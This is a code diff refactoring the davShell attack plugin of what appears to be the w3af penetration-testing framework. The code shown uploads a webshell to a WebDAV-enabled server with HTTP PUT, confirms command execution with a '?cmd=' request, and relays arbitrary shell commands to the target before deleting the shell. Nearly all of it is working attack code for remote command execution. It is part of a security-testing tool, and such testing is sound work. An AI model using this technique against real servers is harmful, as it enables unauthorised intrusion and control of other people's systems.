@@ -21,7 +21,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 '''
 
 
-from core.data.fuzzer.fuzzer import *
+from core.data.fuzzer.fuzzer import createRandAlpha
 import core.controllers.outputManager as om
 # options
 from core.data.options.option import option
@@ -35,8 +35,9 @@ from core.data.kb.shell import shell as shell
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
 
-from plugins.attack.webshells.getShell import getShell
+import plugins.attack.payloads.payloads as payloads
 import urllib
+
 
 class davShell(baseAttackPlugin):
     '''
@@ -46,6 +47,9 @@ class davShell(baseAttackPlugin):
 
     def __init__(self):
         baseAttackPlugin.__init__(self)
+        
+        # Internal variables
+        self._exploit_url = None
         
         # User configured variables
         self._url = ''
@@ -63,27 +67,39 @@ class davShell(baseAttackPlugin):
             kb.kb.append( 'dav', 'dav', v )
     
     def getAttackType(self):
+        '''
+        @return: The type of exploit, SHELL, PROXY, etc.
+        '''        
         return 'shell'
         
     def getVulnName2Exploit( self ):
+        '''
+        This method should return the vulnerability name (as saved in the kb) to exploit.
+        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
+        
+        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
+        
+        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
+        return 'osCommanding' in this method.
+        '''        
         return 'dav'
     
-    def _generateShell( self, vuln ):
+    def _generateShell( self, vuln_obj ):
         '''
-        @parameter vuln: The vuln to exploit.
+        @parameter vuln_obj: The vuln to exploit.
         @return: The shell object based on the vulnerability that was passed as a parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verifyVuln( vuln ):
+        if self._verifyVuln( vuln_obj ):
             # Create the shell object
-            s = davShellObj( vuln )
-            s.setUrlOpener( self._urlOpener )
-            s.setExploitURL( self._exploit )
-            return s
+            shell_obj = davShellObj( vuln_obj )
+            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setExploitURL( self._exploit_url )
+            return shell_obj
         else:
             return None
 
-    def _verifyVuln( self, vuln ):
+    def _verifyVuln( self, vuln_obj ):
         '''
         This command verifies a vuln. This is really hard work! :P
 
@@ -91,70 +107,63 @@ class davShell(baseAttackPlugin):
         '''
         # Create the shell
         filename = createRandAlpha( 7 )
-        extension = urlParser.getExtension( vuln.getURL() )
+        extension = urlParser.getExtension( vuln_obj.getURL() )
         
-        # I get a list of tuples with fileContent and extension to use
-        shellList = getShell( extension )
+        # I get a list of tuples with file_content and extension to use
+        shell_list = payloads.get_webshells( extension )
         
-        for fileContent, realExtension in shellList:
+        for file_content, real_extension in shell_list:
             if extension == '':
-                extension = realExtension
+                extension = real_extension
             om.out.debug('Uploading shell with extension: "'+extension+'".' )
             
             # Upload the shell
-            urlToUpload = urlParser.urlJoin( vuln.getURL() , filename + '.' + extension )
-            om.out.debug('Uploading file: ' + urlToUpload )
-            self._urlOpener.PUT( urlToUpload, data=fileContent )
+            url_to_upload = urlParser.urlJoin( vuln_obj.getURL() , filename + '.' + extension )
+            om.out.debug('Uploading file: ' + url_to_upload )
+            self._urlOpener.PUT( url_to_upload, data=file_content )
             
             # Verify if I can execute commands
-            rnd = createRandAlNum(6)
-            cmd = 'echo+%22' + rnd + '%22'
-            
-            self._exploit = urlParser.getDomainPath( vuln.getURL() ) + filename + '.' + extension + '?cmd='
-            toSend = self._exploit + cmd
-            
-            response = self._urlOpener.GET( toSend )
-            if response.getBody().count( rnd ):
-                om.out.debug('The uploaded shell returned what we expected: ' + rnd )
+            # All w3af shells, when invoked with a blank command, return a 
+            # specific value in the response:
+            # payloads.SHELL_IDENTIFIER
+            response = self._urlOpener.GET( url_to_upload + '?cmd=' )
+            if payloads.SHELL_IDENTIFIER in response.getBody():
+                msg = 'The uploaded shell returned the SHELL_IDENTIFIER: "'
+                msg += payloads.SHELL_IDENTIFIER + '".'
+                om.out.debug( msg )
+                self._exploit_url = url_to_upload + '?cmd='
                 return True
             else:
-                om.out.debug('The uploaded shell with extension: "'+extension+'" DIDN\'T returned what we expected, it returned : ' + response.getBody() )
+                msg = 'The uploaded shell with extension: "'+extension
+                msg += '" DIDN\'T returned what we expected, it returned: ' + response.getBody()
+                om.out.debug( msg )
                 extension = ''
     
-    def getOptionsXML(self):
+    def getOptions( self ):
         '''
-        This method returns a XML containing the Options that the plugin has.
-        Using this XML the framework will build a window, a menu, or some other input method to retrieve
-        the info from the user. The XML has to validate against the xml schema file located at :
-        w3af/core/ui/userInterface.dtd
+        @return: A list of option objects for this plugin.
+        '''
+        d1 = 'URL to exploit with fastExploit()'
+        o1 = option('url', self._url, d1, 'string')
         
-        @return: XML with the plugin options.
-        ''' 
-        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
-        <OptionList>\
-            <Option name="url">\
-                <default>'+self._url+'</default>\
-                <desc>URL to exploit with fastExploit()</desc>\
-                <type>string</type>\
-            </Option>\
-            <Option name="generateOnlyOne">\
-                <default>'+str(self._generateOnlyOne)+'</default>\
-                <desc>If true, this plugin will try to generate only one shell object.</desc>\
-                <type>boolean</type>\
-            </Option>\
-        </OptionList>\
-        '
+        d2 = 'Exploit only one vulnerability.'
+        o2 = option('generateOnlyOne', self._generateOnlyOne, d2, 'boolean')
+        
+        ol = optionList()
+        ol.add(o1)
+        ol.add(o2)
+        return ol
 
     def setOptions( self, optionsMap ):
         '''
         This method sets all the options that are configured using the user interface 
-        generated by the framework using the result of getOptionsXML().
+        generated by the framework using the result of getOptions().
         
         @parameter optionsMap: A dictionary with the options for the plugin.
         @return: No value is returned.
         ''' 
-        self._url = optionsMap['url']
-        self._generateOnlyOne = optionsMap['generateOnlyOne']
+        self._url = optionsMap['url'].getValue()
+        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
 
     def getPluginDeps( self ):
         '''
@@ -181,15 +190,16 @@ class davShell(baseAttackPlugin):
         "PUT" the plugin uploads the corresponding webshell ( php, asp, etc. ) verifies that the shell is working, and if
         everything is working as expected the user can start typing commands.
         
-        No configurable parameters exist.
+        One configurable parameter exists:
+            - URL (only used in fastExploit)
         '''
         
 class davShellObj(shell):
     def setExploitURL( self, eu ):
-        self._exploit = eu
+        self._exploit_url = eu
     
     def getExploitURL( self ):
-        return self._exploit
+        return self._exploit_url
         
     def _rexec( self, command ):
         '''
@@ -199,16 +209,16 @@ class davShellObj(shell):
         @parameter command: The command to send ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        toSend = self.getExploitURL() + urllib.quote_plus( command )
-        response = self._urlOpener.GET( toSend )
+        to_send = self.getExploitURL() + urllib.quote_plus( command )
+        response = self._urlOpener.GET( to_send )
         return response.getBody()
     
     def end( self ):
         om.out.debug('davShellObj is going to delete the webshell that was uploaded before.')
-        urlToDel = urlParser.uri2url( self._exploit )
+        url_to_del = urlParser.uri2url( self._exploit_url )
         try:
-            self._urlOpener.DELETE( urlToDel )
-        except Exception, e:
+            self._urlOpener.DELETE( url_to_del )
+        except w3afException, e:
             om.out.error('davShellObj cleanup failed with exception: ' + str(e) )
         else:
             om.out.debug('davShellObj cleanup complete.')
